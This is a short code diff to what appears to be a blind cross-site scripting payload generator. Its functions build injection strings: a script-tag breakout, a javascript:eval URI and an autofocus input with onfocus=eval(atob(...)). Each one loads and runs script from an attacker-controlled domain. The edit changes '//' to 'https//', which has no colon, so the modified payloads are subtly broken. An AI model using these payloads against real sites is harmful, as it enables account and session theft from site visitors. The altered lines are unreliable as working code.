@@ -85,10 +85,10 @@ export default {
             return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '";document.body.appendChild(a);';
         },
         basic_script: function() {
-            return "\"><script src=\"//" + this.base_domain + "\"><\/script>";
+            return "\"><script src=\"https//" + this.base_domain + "\"><\/script>";
         },
         javascript_uri: function() {
-            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'//" + this.base_domain + "\\';document.body.appendChild(a)')";
+            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https//" + this.base_domain + "\\';document.body.appendChild(a)')";
         },
         input_onfocus: function() {
             return "\"><input onfocus=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " autofocus>";
